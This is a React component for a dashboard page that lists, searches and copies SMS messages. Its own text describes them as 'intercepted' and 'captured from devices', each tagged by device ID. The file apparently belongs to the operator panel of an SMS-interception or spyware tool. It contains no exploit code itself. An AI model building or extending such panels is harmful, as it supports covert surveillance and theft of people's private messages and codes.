import { useState } from 'react'
import { useApp } from '../AppContext'

const SVG = ({ path, size = 14 }: { path: string; size?: number }) => (
  <svg width={size} height={size} viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
    <path d={path} />
  </svg>
)

export default function SmsPage({ allSms }: { allSms: any[] }) {
  const [search, setSearch] = useState('')
  const { toast } = useApp()

  const filtered = allSms.filter(s =>
    (s.sender || '').toLowerCase().includes(search.toLowerCase()) ||
    (s.body || '').toLowerCase().includes(search.toLowerCase())
  )

  const copySms = (el: HTMLElement, text: string) => {
    const decoded = text.replace(/\\n/g, '\n')
    navigator.clipboard.writeText(decoded).then(() => {
      toast('SMS copied!', 'success')
      el.classList.add('copy-flash')
      setTimeout(() => el.classList.remove('copy-flash'), 800)
    }).catch(() => {
      const ta = document.createElement('textarea')
      ta.value = decoded
      ta.style.cssText = 'position:fixed;opacity:0'
      document.body.appendChild(ta)
      ta.select()
      document.execCommand('copy')
      document.body.removeChild(ta)
      toast('SMS copied!', 'success')
      el.classList.add('copy-flash')
      setTimeout(() => el.classList.remove('copy-flash'), 800)
    })
  }

  const lastDeviceName = (deviceId: string) => {
    return deviceId.slice(0, 10) + '...'
  }

  return (
    <div>
      <div className="search-bar">
        <span className="search-icon"><SVG path="M10 2a8 8 0 1 0 0 16 8 8 0 0 0 0-16zM21 21l-4.35-4.35" size={15}/></span>
        <input type="text" placeholder="Search SMS by sender or content..." value={search} onChange={(e) => setSearch(e.target.value)} />
      </div>

      {filtered.length === 0 ? (
        <div className="empty">
          <div className="empty-icon"><SVG path="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z" size={48}/></div>
          <div className="empty-text">No SMS intercepted yet</div>
          <div className="empty-sub">SMS will appear here when captured from devices</div>
        </div>
      ) : (
        <div className="sms-list">
          {filtered.slice(0, 200).map((s, i) => (
            <div key={s._ts || i} className="sms-item" onClick={(e) => copySms(e.currentTarget, s.body || '')}>
              <div className="sms-top">
                <span className="sms-sender">{s.sender || 'Unknown'}</span>
                <span className="sms-type in">IN</span>
              </div>
              <div className="sms-body">{s.body || ''}</div>
              <div className="sms-time">
                <SVG path="M12 1v4M12 19v4M4.22 4.22l2.83 2.83M16.95 16.95l2.83 2.83M1 12h4M19 12h4" size={11}/>
                {s.date || new Date(s.timestamp || 0).toLocaleString()} &bull; {lastDeviceName(s.deviceId)}
              </div>
            </div>
          ))}
        </div>
      )}
    </div>
  )
}
